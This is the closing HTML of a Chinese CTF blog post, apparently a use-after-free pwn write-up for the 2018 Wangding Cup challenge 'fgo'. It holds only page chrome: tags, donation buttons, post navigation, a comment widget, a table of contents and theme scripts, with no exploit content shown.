+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/Binary/" rel="tag">Binary</a>, <a class="has-link-grey -link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="has-link-grey -link" href="/tags/UAF/" rel="tag">UAF</a>, <a class="has-link-grey -link" href="/tags/pwn/" rel="tag">pwn</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3>
+        <div class="buttons is-centered">
+            
+                
+<a class="button is-info donate">
+    <span class="icon is-small">
+        <i class="fab fa-alipay"></i>
+    </span>
+    <span>支付宝</span>
+    <div class="qrcode"><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190822175230.jpg" alt="支付宝"></div>
+</a>
+
+                
+                
+<a class="button is-success donate">
+    <span class="icon is-small">
+        <i class="fab fa-weixin"></i>
+    </span>
+    <span>微信</span>
+    <div class="qrcode"><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190822175230.jpg" alt="微信"></div>
+</a>
+
+                
+        </div>
+    </div>
+</div>
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/post/72ca88fe.html">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">2018网鼎杯PWN-easyFMT</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/post/b32d2ce7.html">
+                <span class="level-item">2018网鼎杯MISC——虚幻</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<div id="valine-thread" class="content"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#valine-thread' ,
+        notify: true,
+        verify: false,
+        app_id: '2oTcdkk2ubE6P9DwKwwTTlDK-gzGzoHsz',
+        app_key: 'z1TMyiu5W0zvLI3qKElhM6uU',
+        placeholder: '不用注册也可以评论哟~支持Markdown~'
+    });
+</script>
+
+    </div>
+</div>
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left is-sticky">
+    
+        
+<div class="card widget" id="toc">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                目录
+            </h3>
+            <ul class="menu-list"><li>
+        <a class="is-flex" href="#分析过程">
+        <span class="has-mr-6">1</span>
+        <span>分析过程</span>
+        </a></li><li>
+        <a class="is-flex" href="#利用过程">
+        <span class="has-mr-6">2</span>
+        <span>利用过程</span>
+        </a></li><li>
+        <a class="is-flex" href="#EXP">
+        <span class="has-mr-6">3</span>
+        <span>EXP</span>
+        </a></li></ul>
+        </div>
+    </div>
+</div>
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen is-sticky">
+        
+        </div>
+    
+</div>
+
+                
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.png" alt="2018网鼎杯PWN-fgo" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2019 Jon Tsang&nbsp;
+                <!--Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>-->
+                
+                <br>
+                <span id="busuanzi_container_site_uv">
+                共<span id="busuanzi_value_site_uv">0</span>个访客
+                </span>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+<script>
+var IcarusThemeSettings = {
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+    
+    
+    
+    <script src="/js/animation.js"></script>
+    
+
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+    <script src="/js/gallery.js" defer></script>
+    
+
+    
+    
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/" target="_blank" rel="noopener">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+
+    
+    
+
+<a id="back-to-top" title="回到顶端" href="javascript:;" target="_blank" rel="noopener">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
